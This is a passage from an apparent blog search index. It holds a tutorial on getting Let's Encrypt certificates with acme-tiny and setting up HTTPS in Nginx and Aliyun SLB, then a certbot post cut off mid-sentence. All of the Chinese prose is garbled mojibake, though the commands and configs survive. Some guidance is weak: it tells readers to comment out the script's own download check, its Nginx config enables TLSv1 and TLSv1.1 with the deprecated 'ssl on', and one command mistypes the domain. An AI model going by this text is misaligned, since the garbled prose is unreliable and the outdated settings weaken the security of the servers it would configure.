å¯†é¡¹ç›®åº”è¿è€Œç”Ÿï¼Œå®ƒç”±äº’è”ç½‘å®‰å…¨ç ”ç©¶å°ç»„ISRGï¼ˆäº’è”ç½‘å®‰å…¨ç ”ç©¶å°ç»„ï¼‰æä¾›æœåŠ¡ï¼Œå¾ˆæ—©ä¹‹å‰æˆ‘å°±åœ¨å…³æ³¨ Letâ€™s Encryptè¿™ä¸ªå…è´¹ã€è‡ªåŠ¨åŒ–ã€å¼€æ”¾çš„è¯ä¹¦ç­¾å‘æœåŠ¡ã€‚ISRGæ˜¯æ¥è‡ªç¾å›½åŠ åˆ©ç¦å°¼äºšå·çš„ä¸€ä¸ªå…¬ç›Šç»„ç»‡.Letâ€™s Encryptå¾—åˆ°äº†Mozillaï¼ŒCiscoå’ŒChromeç­‰ä¼—å¤šå…¬å¸å’Œæœºæ„çš„æ”¯æŒã€‚ ç”³è¯· Let&#39;s Encrypt è¯ä¹¦ä¸ä½†å…è´¹ï¼Œè¿˜éå¸¸ç®€å•ï¼Œè™½ç„¶æ¯æ¬¡åªæœ‰ 90 å¤©çš„æœ‰æ•ˆæœŸï¼Œä½†å¯ä»¥é€šè¿‡è„šæœ¬å®šæœŸæ›´æ–°ï¼Œé…å¥½ä¹‹åä¸€åŠ³æ°¸é€¸ã€‚æœ¬æ•™ç¨‹äº²æµ‹æœ‰æ•ˆï¼Œå¸Œæœ›å¯¹æ­£åœ¨å¯»æ‰¾å…è´¹HTTPSæ–¹æ¡ˆçš„ä½ æœ‰ä¸€å®šçš„å¸®åŠ©ï¼Œæœ¬æ–‡è®°å½•æœ¬ç«™ç”³è¯·è¿‡ç¨‹å’Œé‡åˆ°çš„é—®é¢˜ã€‚ æŒ‰ç…§æˆ‘ä»¬çš„åŠ å¯†å®˜æ–¹æä¾›çš„å·¥å…·å®‰è£…HTTPSçš„è¯ä¸è¿‡äºå¤æ‚ï¼Œäºæ˜¯æœ‰å¥½å¿ƒäººæä¾›äº†æ›´ä¸ºè½»å·§çš„å·¥å…·å®‰è£…ï¼Œæè‡´çº¤å·§è¯ç”Ÿäº†ï¼Œå®ƒçš„ä»£ç é‡åœ¨200è¡Œå†…ï¼Œåªéœ€ä¾èµ–çš„Pythonå’ŒOpenSSLçš„ã€‚ ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºLetâ€™s EncryptåŠ å¯†è´¦å·é¦–å…ˆåˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œä¾‹å¦‚ sslç”¨æ¥å­˜æ”¾å„ç§ä¸´æ—¶æ–‡ä»¶å’Œæœ€åçš„è¯ä¹¦æ–‡ä»¶ã€‚è¿›å…¥è¿™ä¸ªç›®å½•ï¼Œåˆ›å»ºä¸€ä¸ªRSAç§é’¥ç”¨äº Letâ€™s Encrypt è¯†åˆ«ä½ çš„èº«ä»½ï¼š è®©æˆ‘ä»¬åŠ å¯†ä½¿ç”¨ä¸€ä¸ªç§é’¥æ¥è¿›è¡Œè´¦å·çš„åˆ›å»ºä¸ç™»é™†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨opensslåˆ›å»ºä¸€ä¸ªaccount.key 123456[root@ihaozhuo1 srv]# mkdir ssl &amp;&amp; cd ssl[root@ihaozhuo1 ssl]# openssl genrsa 4096 &gt; account.keyGenerating RSA private key, 4096 bit long modulus...........................++...........................++e is 65537 (0x10001) ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåŸŸåçš„CSRï¼ˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰è®©æˆ‘ä»¬åŠ å¯†ä½¿ç”¨çš„ACMEåè®®éœ€è¦ä¸€ä¸ªCSRæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥é‡æ–°ç”³è¯·HTTPSè¯ä¹¦ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºåŸŸåCSRï¼Œåœ¨åˆ›å»ºCSRä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç»™æˆ‘ä»¬çš„åŸŸååˆ›å»ºä¸€ä¸ªç§é’¥ï¼ˆè¿™ä¸ªå’Œä¸Šé¢çš„è´¦æˆ·ç§é’¥æ— å…³ï¼‰ã€‚æ¥ç€å°±å¯ä»¥ç”Ÿæˆ CSRï¼ˆCertificate Signing Requestï¼Œè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰æ–‡ä»¶äº†ã€‚åœ¨è¿™ä¹‹å‰ï¼Œè¿˜éœ€è¦åˆ›å»ºåŸŸåç§é’¥ï¼ˆä¸€å®šä¸è¦ä½¿ç”¨ä¸Šé¢çš„è´¦æˆ·ç§é’¥ï¼‰ï¼Œæ ¹æ®è¯ä¹¦ä¸åŒç±»å‹ï¼ŒåŸŸåç§é’¥ä¹Ÿå¯ä»¥é€‰æ‹© RSA å’Œ ECC ä¸¤ç§ä¸åŒç±»å‹ã€‚ä»¥ä¸‹ä¸¤ç§æ–¹å¼è¯·æ ¹æ®å®é™…æƒ…å†µäºŒé€‰ä¸€ã€‚ 1ï¼‰åˆ›å»º RSA ç§é’¥ï¼ˆå…¼å®¹æ€§å¥½ï¼‰ï¼š 1openssl genrsa 4096 &gt; domain.key 2ï¼‰æ³¨æ„ï¼šä¸€å®šä¸è¦ä½¿ç”¨ä¸Šé¢åˆ›å»ºå¥½çš„account.key æ¥å½“domain.key â—ï¸ æœ‰äº†ç§é’¥æ–‡ä»¶ï¼Œå°±å¯ä»¥åˆ›å»ºç”Ÿæˆ CSRæ–‡ä»¶äº†ã€‚åœ¨ CSRä¸­æ¨èè‡³å°‘æŠŠåŸŸåå¸¦ www å’Œä¸å¸¦wwwçš„ä¸¤ç§æƒ…å†µéƒ½åŠ è¿›å»ï¼Œå…¶å®ƒå­åŸŸå¯ä»¥æ ¹æ®éœ€è¦æ·»åŠ ,æ›¿æ¢ä¸‹é¢çš„ihaozhuo.comå³å¯ (ç›®å‰ä¸€å¼ è¯ä¹¦æœ€å¤šå¯ä»¥åŒ…å« 100 ä¸ªåŸŸå) 3ï¼‰æ³¨æ„ï¼Œç¨åä¼šè¯´åˆ°ï¼Œæ¯ä¸ªåŸŸåéƒ½ä¼šæ¶‰åŠåˆ°éªŒè¯ï¼‰ 1234567ï¼ƒå•ä¸ªåŸŸåopenssl req -new -sha256 -key domain.key -subjâ€œ/CN=ihaozhuo.ccomâ€&gt; domain.csrï¼ƒå¤šä¸ªåŸŸåï¼ˆå¦‚æœä½ æœ‰å¤šä¸ªåŸŸåï¼Œæ¯”å¦‚ï¼šwww.ihaozhuo.com å’Œihaozhuo.comï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ï¼‰openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf \"[SAN]\\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com\")) &gt; domain.csr 4ï¼‰è¯´æ˜ï¼šihaozhuo.comï¼Œwww.ihaozhuo.com æ›¿æ¢æˆä½ çš„åŸŸåæ‰§è¡Œè¿™ä¸€æ­¥æ—¶ï¼Œéœ€è¦æŒ‡å®šopenssl.cnfæ–‡ä»¶ï¼Œä¸€èˆ¬è¿™ä¸ªæ–‡ä»¶åœ¨ä½ çš„opensslå®‰è£…ç›®å½•åº•ä¸‹ã€‚ å¦‚æœæç¤ºæ‰¾ä¸åˆ° /etc/ssl/openssl.cnfæ–‡ä»¶ï¼Œè¯·çœ‹çœ‹/usr/local/openssl/ssl/openssl.cnf å’Œ/etc/pki/tls/openssl.cnfæ˜¯å¦å­˜åœ¨ã€‚ 12345[root@ihaozhuo1 ssl]# find / -name openssl.cnf ##æŸ¥æ‰¾openssl.cnfæ–‡ä»¶/etc/pki/tls/openssl.cnf[root@ihaozhuo1 ssl]# ln -s /etc/pki/tls/openssl.cnf /etc/ssl/openssl.cnf #åšä¸ªè½¯é“¾æ¥ [root@ihaozhuo1 ssl]# openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf \"[SAN]\\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com\")) &gt; domain.csr å¦‚æœè¿˜æ˜¯ä¸è¡Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨äº¤äº’æ–¹å¼åˆ›å»ºCSRï¼ˆéœ€è¦æ³¨æ„ Common Nameå¿…é¡»ä¸ºä½ çš„åŸŸåï¼‰ï¼š 1openssl req -new -sha256 -key domain.key -out domain.csr ç¬¬ä¸‰æ­¥ï¼šé…ç½®åŸŸåéªŒè¯CAåœ¨ç­¾å‘DVï¼ˆåŸŸéªŒè¯ï¼‰è¯ä¹¦æ—¶ï¼Œéœ€è¦éªŒè¯åŸŸåæ‰€æœ‰æƒã€‚ä¼ ç»ŸCAçš„éªŒè¯æ–¹å¼ä¸€èˆ¬æ˜¯å¾€admin@ihaozhuo.comå‘éªŒéªŒé‚®ä»¶ï¼Œè€Œè®©æˆ‘ä»¬åŠ å¯†æ˜¯åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªéšæœºéªŒè¯æ–‡ä»¶ï¼Œå†é€šè¿‡åˆ›å»ºCSRæ—¶æŒ‡å®šçš„åŸŸåè®¿é—®ï¼Œå¦‚æœå¯ä»¥è®¿é—®åˆ™è¡¨æ˜ä½ å¯¹è¿™ä¸ªåŸŸåæœ‰æ§åˆ¶æƒã€‚ é¦–å…ˆåˆ›å»ºç”¨äºå­˜æ”¾éªŒè¯æ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚ï¼š 1mkdir -p var/www/challenge ç„¶åé…ç½®ä¸€ä¸ªNginxæœåŠ¡ï¼Œä»¥Nginxä¸ºä¾‹:(æ³¨æ„ï¼šè¿™é‡Œçš„ç«¯å£æ˜¯80ï¼Œä¸æ˜¯443ï¼‰ 123456789101112131415server &#123; listen 80; server_name www.ihaozhuo.com ihaozhuo.com; location /.well-known/acme-challenge/ &#123; alias /var/www/challenges/; index index.html index.php index.jsp index.htm; try_files $uri =404;&#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125; è¿™æ˜¯æˆ‘åœ¨ä¸Šé¢é…ç½®å®Œæˆä»¥åéœ€è¦é‡å¯Nginxï¼Œå…ˆNginx -tæ ¡éªŒä¸‹æ˜¯å¦æœ‰æ²¡æœ‰é—®é¢˜ã€‚ 123456789101112131415161718[root@ihaozhuo1 conf]# nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful``` å¦‚ä½•éªŒè¯ä¸Šé¢è®¾ç½®æ˜¯å¦æˆåŠŸï¼Ÿ æˆ‘ä»¬åªè¦åœ¨ç›®å½•ï¼š/var/www/challenges/ ä¸‹é¢åˆ›å»ºæ–‡ä»¶ï¼štest.htmlç„¶åé€šè¿‡http://www.ihaozhuo.com/.well-known/acme-challenge/test.html URLè®¿é—®åœ°å€é‚£ä¸ªæ–‡ä»¶ï¼Œå¦‚æœèƒ½è®¿é—®æˆåŠŸè¯´æ˜ä½ é…ç½®æ²¡é—®é¢˜;å¦åˆ™å°±è¯´æ˜é…ç½®é”™è¯¯âŒï¼Œè¿™ä¸€æ­¥ä¸èƒ½å®ç°ä¸‹é¢å°±ä¸èƒ½æˆåŠŸäº†ã€‚ä»¥ä¸Šé…ç½®ä¼˜å…ˆæŸ¥æ‰¾ `var/www/challenge`ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±é‡å®šå‘åˆ°` HTTPS` åœ°å€ã€‚è¿™ä¸ªéªŒè¯æœåŠ¡ä»¥åæ›´æ–°è¯ä¹¦è¿˜è¦ç”¨åˆ°ï¼Œå»ºè®®ä¸€ç›´ä¿ç•™ã€‚### ç¬¬å››æ­¥ï¼šè·å–ç½‘ç«™è¯ä¹¦**1ï¼‰ä¸Šé¢é…ç½®å¥½ï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨acme-tiny.pyæ¥è·å–ç½‘ç«™è¯ä¹¦** acme-tinyè„šæœ¬æ–‡ä»¶ä¸ŠGithubä¸‹è½½ï¼š[acme-tiny.py](https://github.com/diafygi/acme-tiny)**2ï¼‰å…ˆæŠŠ acme-tiny è„šæœ¬ä¿å­˜åˆ°ä¹‹å‰çš„sslç›®å½•**```bashwget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py 3ï¼‰ç„¶åæŒ‡å®šè´¦æˆ·ç§é’¥ã€CSR ä»¥åŠéªŒè¯ç›®å½•ï¼Œæ‰§è¡Œè„šæœ¬æ¥è·å–ç½‘ç«™è¯ä¹¦ 1python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crt 4ï¼‰å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œå½“å‰ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€ä¸ªsigned.crtè¿™å°±æ˜¯ç”³è¯·å¥½çš„è¯ä¹¦æ–‡ä»¶ï¼Œå¦‚æœè·Ÿæˆ‘ä¸€æ ·æŠ¥é”™äº†è¯·çœ‹ä¸‹é¢ 1234567891011121314[root@ihaozhuo1 ssl]# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crtParsing account key...Parsing CSR...Registering account...Already registered!Verifying ihaozhuo.com...Traceback (most recent call last): File \"acme_tiny.py\", line 198, in &lt;module&gt; main(sys.argv[1:]) File \"acme_tiny.py\", line 194, in main signed_crt = get_crt(args.account_key, args.csr, args.acme_dir, log=LOGGER, CA=args.ca) File \"acme_tiny.py\", line 123, in get_crt wellknown_path, wellknown_url))ValueError: Wrote file to /var/www/challenges/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg, but couldn't download http://ihaozhuo.com/.well-known/acme-challenge/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg 5ï¼‰è„šæœ¬é—®é¢˜ï¼š è®°å¾—åœ¨ç½‘ç«™è®°å¾—åŸŸåè§£æè¦å¯¹ï¼Œéƒ½æ˜¯ä½ ç°åœ¨ç”³è¯·è¯ä¹¦è¿™å°å¤–ç½‘è§£æåœ°å€ï¼š http://ihaozhuo.com/ä¸é€šé‚£è§£æå°±å‡ºç°é—®é¢˜äº†ã€‚ ç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šäººè¯´åŸŸåDNSæœåŠ¡å™¨è§£æå¯¼è‡´åŸŸåä¸è¡Œï¼Œè¿™ä¸ªéªŒè¯äº†ä»¥åä¸æ˜¯çš„ï¼Œè¿™ä¸ªæ˜¯GitHubè¿™ä¸ªè„šæœ¬acme_tiny.pyé—®é¢˜å¯¼è‡´çš„ï¼Œéœ€è¦ç¼–è¾‘è„šæœ¬æ³¨é‡Šæ‰ä¸‹é¢å…¨éƒ¨å†…å®¹å³å¯ 116è¡Œ-123è¡Œï¼š 12345678# try: # resp = urlopen(wellknown_url) # resp_data = resp.read().decode('utf8').strip() # assert resp_data == keyauthorization # except (IOError, AssertionError): # os.remove(wellknown_path) # raise ValueError(\"Wrote file to &#123;0&#125;, but couldn't download &#123;1&#125;\".format( # wellknown_path, wellknown_url)) å¦‚æœä¿®æ”¹æ²¡æœ‰ç”¨ï¼Œå¯ä»¥åˆ°æˆ‘è¿™é‡Œä¸‹è½½Githubä¸‹è½½acme_tiny.py 6ï¼‰ç„¶åä¿å­˜å†æ¬¡è·å–ç½‘ç«™è¯ä¹¦ 1234567891011[root@ihaozhuo1 ssl]# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crtParsing account key...Parsing CSR...Registering account...Already registered!Verifying ihaozhuo.com...ihaozhuo.com verified!Verifying www.ihaozhuo.com...www.ihaozhuo.com verified!Signing certificate...Certificate signed! ãŠ—ï¸ å¦‚æœçœ‹åˆ°å¦‚ä¸Šå†…å®¹ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ çš„ç½‘ç«™è¯ä¹¦å·²ç»æˆåŠŸè·å–äº†ã€‚è¿™æ—¶å€™æŸ¥çœ‹ç›®å½•ä¸‹é¢æœ‰å¦‚ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š 12345678[root@ihaozhuo1 ssl]# llæ€»ç”¨é‡ 36-rw-r--r-- 1 root root 3243 3æœˆ 30 16:42 account.keydrwxr-xr-x 4 root root 4096 3æœˆ 30 17:31 acme-tiny-rw-r--r-- 1 root root 9159 3æœˆ 30 19:23 acme_tiny.py-rw-r--r-- 1 root root 1639 3æœˆ 30 17:00 domain.csr-rw-r--r-- 1 root root 3243 3æœˆ 30 16:53 domain.key-rw-r--r-- 1 root root 2159 3æœˆ 30 22:11 signed.crt åˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä»¬å·²ç»æˆåŠŸç”³è¯·åˆ°Letâ€™sENcrpytçš„ç½‘ç«™è¯ä¹¦ï¼Œå¯¹äºNginxç”¨æˆ·æˆ‘ä»¬è¿˜éœ€è¦æŠŠLetâ€™s ENcrpytçš„ä¸­é—´è¯ä¹¦åŠ å…¥åˆ°åˆšåˆšç”Ÿæˆçš„signed.crtæ–‡ä»¶ä¸­ã€‚å…·ä½“æ“ä½œï¼š ç¬¬äº”æ­¥ï¼šå®‰è£…è¯ä¹¦è¯ä¹¦ç”Ÿæˆåï¼Œå°±å¯ä»¥æŠŠå®ƒé…ç½®åœ¨web æœåŠ¡å™¨ä¸Šäº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒNginxéœ€è¦è¿½åŠ ä¸€ä¸ªLetâ€™s Encryptçš„ä¸­é—´è¯ä¹¦ï¼Œåœ¨ Nginx é…ç½®ä¸­ï¼Œéœ€è¦æŠŠä¸­é—´è¯ä¹¦å’Œç½‘ç«™è¯ä¹¦åˆåœ¨ä¸€èµ·ï¼š 123456789101112wget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &gt; intermediate.pemcat signed.crt intermediate.pem &gt; chained.pem[root@ihaozhuo1 ssl]# llæ€»ç”¨é‡ 36-rw-r--r-- 1 root root 3243 3æœˆ 30 22:06 account.key-rw-r--r-- 1 root root 9159 3æœˆ 30 19:23 acme_tiny.py-rw-r--r-- 1 root root 3834 3æœˆ 30 22:51 chained.pem-rw-r--r-- 1 root root 1639 3æœˆ 30 22:07 domain.csr-rw-r--r-- 1 root root 3243 3æœˆ 30 22:06 domain.key-rw-r--r-- 1 root root 1675 3æœˆ 30 22:51 intermediate.pem-rw-r--r-- 1 root root 2159 3æœˆ 30 22:51 signed.crt 1ï¼‰ç°åœ¨æˆ‘ä»¬å¯ä»¥åœ¨Nginxå¯åŠ¨HTTPSï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ä½ ä¹‹å‰ç½‘ç«™Nginx.confé‡Œé¢é…ç½® æ³¨æ„âš ï¸ ï¼šä¸ºäº†ä¸å½±å“ç°åœ¨æ­£åœ¨è¿è¡Œçš„ç½‘ç«™ï¼Œåœ¨é…ç½®HTTPSçš„æ—¶å€™æœ€å¥½å°†ä½ ç°åœ¨é…ç½®å¥½çš„æ–‡ä»¶å…¨éƒ¨å¤‡ä»½èµ·æ¥ï¼Œè¿™æ ·ä½ åœ¨å¯åŠ¨HTTPSå‡ºç°é—®é¢˜å¯ä»¥èƒ½å¤Ÿå¿«é€Ÿæ¢å¤å›æ¥ã€‚ Nginxé…ç½®æ–‡ä»¶åŠ å…¥ä»¥ä¸‹é…ç½®ï¼š 12345678910111213141516171819202122232425262728server &#123; listen 80; server_name ihaozhuo.com, www.ihaozhuo.com; location /.well-known/acme-challenge/ &#123; alias /var/www/challenges/; try_files $uri =404; &#125; ...the rest of your config&#125;server &#123; listen 443; server_name ihaozhuo.com, www.ihaozhuo.com; ssl on; ssl_certificate /srv/ssl/chained.pem; ssl_certificate_key /srv/ssl/domain.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA; ssl_session_cache shared:SSL:50m; ssl_prefer_server_ciphers on; ...the rest of your config&#125; åœ¨Chromeæµè§ˆå™¨é‡Œé¢ä½ å¯ä»¥è®¿é—®httpså¼€å¤´çš„ï¼Œä½†æ²¡æœ‰çœ‹åˆ°ç»¿è‰²é”æ ‡è®°ï¼Œè¿™æ˜¯å› ä¸ºä½ ç½‘ç«™æœ‰è¯·æ±‚http://xxxèµ„æºï¼Œè¿™ä¸ªé—®é¢˜æˆ‘é‡åˆ°ä»¥åæŸ¥äº†å¾ˆå¤šï¼Œå› ä¸ºæˆ‘ç½‘ç«™å¾ˆæ—©ä¹‹å‰å°±æœ‰äº†ï¼Œé‡Œé¢é…ç½®çš„åœ°å€éƒ½æ˜¯httpè¦ä¿®æ”¹è¿‡æ¥éå¸¸éº»çƒ¦ï¼Œæ‰€ä»¥ç”³è¯·è¯ä¹¦ä¸€å¼€å§‹åŸŸåä¸‹æ¥å°±è¦ç”³è¯·è¿™æ˜¯æœ€å¥½çš„ï¼Œå¦‚æœä½ æƒ…å†µå·²ç»è·Ÿæˆ‘ä¸€æ ·ï¼Œé‚£ä½ éœ€è¦æŠŠæ‰€æœ‰çš„http://xxxx èµ„æºå…¨éƒ¨åˆ‡æ¢æˆï¼šhttps://xxx çš„èµ„æºï¼Œè¿™æ ·ç»¿è‰²çš„é”æ‰ä¼šå‡ºç°ã€‚ ç¬¬å…­æ­¥ï¼šå®šæœŸæ›´æ–°è®¿é—®æŸ¥çœ‹ä¸‹ç½‘ç«™è¯¦ç»†ä¿¡æ¯ï¼š 1234567891011121314151617181920212223242526272829[root@ihaozhuo1 conf]# curl -v https://www.ihaozhuo.com/home.html* About to connect() to www.ihaozhuo.com port 443 (#0)* Trying 120.27.185.86...* Connected to www.ihaozhuo.com (120.27.185.86) port 443 (#0)* Initializing NSS with certpath: sql:/etc/pki/nssdb* CAfile: /etc/pki/tls/certs/ca-bundle.crt CApath: none* Server certificate:* subject: CN=ihaozhuo.com* start date: 3æœˆ 30 13:51:00 2017 GMT* expire date: 6æœˆ 28 13:51:00 2017 GMT* common name: ihaozhuo.com* issuer: CN=Let's Encrypt Authority X3,O=Let's Encrypt,C=US* NSS error -8179 (SEC_ERROR_UNKNOWN_ISSUER)* Peer's Certificate issuer is not recognized.* Closing connection 0curl: (60) Peer's Certificate issuer is not recognized.More details here: http://curl.haxx.se/docs/sslcerts.htmlcurl performs SSL certificate verification by default, using a \"bundle\" of Certificate Authority (CA) public keys (CA certs). If the default bundle file isn't adequate, you can specify an alternate file using the --cacert option.If this HTTPS server uses a certificate signed by a CA represented in the bundle, the certificate verification probably failed due to a problem with the certificate (it might be expired, or the name might not match the domain name in the URL).If you'd like to turn off curl's verification of the certificate, use the -k (or --insecure) option. Letâ€™s Encrypt ç­¾å‘çš„è¯ä¹¦åªæœ‰90å¤©æœ‰æ•ˆæœŸï¼Œä½†å¯ä»¥é€šè¿‡è„šæœ¬å®šæœŸæ›´æ–°ã€‚ä½ å¯ä»¥åˆ›å»ºäº†ä¸€ä¸ªè‡ªåŠ¨æ›´æ–°è„šæœ¬renew_cert.shï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456#!/usr/bin/shpython /srv/ssl/acme_tiny.py --account-key /srv/ssl/account.key --csr /srv/ssl/domain.csr --acme-dir /var/www/challenges/ &gt; /srv/ssl/signed.crt || exitwget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &gt; intermediate.pemcat /srv/ssl/signed.crt intermediate.pem &gt; /srv/ssl/chained.pemservice nginx reload ä¿®æ”¹crontabé…ç½®ï¼ŒåŠ å…¥ä»¥ä¸‹å†…å®¹ï¼š 12#æ¯ä¸ªæœˆæ‰§è¡Œä¸€æ¬¡0 0 1 * * /srv/ssl/renew_cert.sh 2&gt;&gt; /var/log/acme_tiny.log å¤§åŠŸå‘Šæˆï¼Œä¸è¿‡å…ˆåˆ«æ€¥ï¼Œè®¿é—®ä¸‹è‡ªå·±çš„HTTPSç½‘ç«™æ˜¯å¦æ­£å¸¸ï¼Œä¸å‡ºæ„å¤–çš„è¯ï¼Œç½‘ç«™æ­£å¼å¯ç”¨HTTPSï¼Œä½†æ˜¯ç½‘ç«™å¦‚æœæœ‰ç”¨CDNçš„è¯ï¼Œé‚£ä¹ˆéœ€è¦CDNä¹Ÿæ”¯æŒHTTPSæ‰è¡Œï¼Œå¦åˆ™æ— æ³•æ­£å¸¸åŠ è½½CDNçš„èµ„æºï¼Œç±»ä¼¼çš„é”™è¯¯å¦‚ï¼š 1Mixed Content: The page at 'https://ihaozhuo.com/' was loaded over HTTPS, but requested an insecure script 'http://app.h5.ihaozhuo.combdimg.com/yjk/css/jquery.min.js'. This request has been blocked; the content must be served over HTTPS. ä¸€ç§è§£å†³æ–¹æ³•å°±æ˜¯ä½¿ç”¨Upyunæ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å¯å‚è€ƒï¼šæˆ‘å†™çš„ä¸€ç¯‡æ–‡ç« å¦‚ä½•è§£å†³httpsè·¨ç«™è®¿é—®è¯ä¹¦ä¸å®‰å…¨è®¿é—®ã€‚ ä¸€ç§è§£å†³æ–¹æ³•å°±æ˜¯ä½¿ç”¨ä¸ƒç‰›çš„äº‘å­˜å‚¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å¯å‚è€ƒï¼šhttps://blog.blahgeek.com/qiniu-cdn-serve-static/ é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPSä½¿ç”¨é˜¿é‡Œäº‘å¾ˆç®€å•ï¼Œä¸éœ€è¦å¤ªå¤šçš„é…ç½®ä¸è¿‡ä¸ªäººè¿˜æ˜¯å–œæ¬¢Nginxå»åšä»£ç†è®¿é—®ã€‚ å…¬å¸åæœŸæ›´æ–°äº†æœ¬åœ°çš„Nginxå»åšè´Ÿè½½å‡è¡¡ç›´æ¥ä½¿ç”¨SLB ï¼Œè¿™é‡Œè®°å½•ä¸‹ç”³è¯·äº†è¯ä¹¦ä»¥ååªéœ€è¦chained.pemå’Œç§é’¥domain.keyã€‚ åœ¨SLBè´Ÿè½½å‡è¡¡å·¦ä¾§æœ‰è¯ä¹¦ç®¡ç†-åˆ›å»ºè¯ä¹¦-é€‰æ‹©æœåŠ¡å™¨è¯ä¹¦ã€‚ ç„¶ååœ¨è´Ÿè½½å‡è¡¡ä¸Šé¢è®¾ç½®ä¸‹ç›‘å¬ç«¯å£é€‰æ‹©ä¸‹å¯¹åº”è¯ä¹¦å°±å¯ä»¥äº†ã€‚ å‚è€ƒï¼šGitHub å®‰è£…æ•™ç¨‹","link":"/2016/11/23/WebæœåŠ¡æŠ€æœ¯/ç”³è¯·è¯ä¹¦Https/å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦+é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPS/"},{"title":"å…è´¹ Httpsè¯ä¹¦ï¼ˆLet'S Encryptï¼‰ç”³è¯·ä¸é…ç½®","text":"å…è´¹ Https è¯ä¹¦ï¼ˆLetâ€™S Encryptï¼‰ç”³è¯·ä¸é…ç½®ä¹‹å‰è¦ç”³è¯·å…è´¹çš„ https è¯ä¹¦æ“ä½œæ­¥éª¤ç›¸å½“éº»çƒ¦ï¼Œä»Šå¤©çœ‹åˆ°æœ‰äººåœ¨è®¨è®ºï¼Œå°±æœç´¢äº†ä¸€ä¸‹ã€‚å‘ç°ç°åœ¨ç”³è¯·æ­¥éª¤ç®€å•å¤šäº†ã€‚ 1. ä¸‹è½½ certbot123git clone https://github.com/certbot/certbotcd certbot./certbot-auto --help è§£å‹æ‰“å¼€æ‰§è¡Œå°±ä¼šæœ‰ç›¸å…³æç¤º 2. ç”Ÿæˆå…è´¹è¯ä¹¦12./certbot-auto certonly --webroot --agree-tos -v -t --email é‚®ç®±åœ°å€ -w ç½‘ç«™æ ¹ç›®å½• -d ç½‘ç«™åŸŸå./certbot-auto certonly --webroot --agree-tos -v -t --email keeliizhou@gmail.com -w /path/to/your/web/root -d ihaozhuo.com æ³¨æ„ è¿™é‡Œ é»˜è®¤ä¼šè‡ªåŠ¨ç”Ÿæˆ /ç½‘ç«™æ ¹ç›®å½•/.well-known/acme-challengeï¼Œç„¶å shell è„šæœ¬ä¼šå¯¹åº”çš„è®¿é—® ç½‘ç«™åŸŸå/.well-known/acme-challenge å¦‚æœè¿”å›æ­£å¸¸å°±ç¡®è®¤äº†ä½ å¯¹è¿™ä¸ªç½‘ç«™çš„æ‰€æœ‰æƒï¼Œå°±èƒ½é¡ºåˆ©ç”Ÿæˆ 3. è·å–è¯ä¹¦å¦‚æœä¸Šé¢çš„æ­¥éª¤æ­£å¸¸ shell è„šæœ¬ä¼šå±•ç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼š 123- Congratulations! Your certificate and chain have been saved at/etc/letsencrypt/live/ç½‘ç«™åŸŸå/fullchain.pem... 4. ç”Ÿæˆ dhparamsä½¿ç”¨ openssl å·¥å…·ç”Ÿæˆ dhparams 1openssl dhparam -out /etc/ssl/certs/dhparams.pem 2048 5. é…ç½® Nginxæ‰“å¼€ nginx server 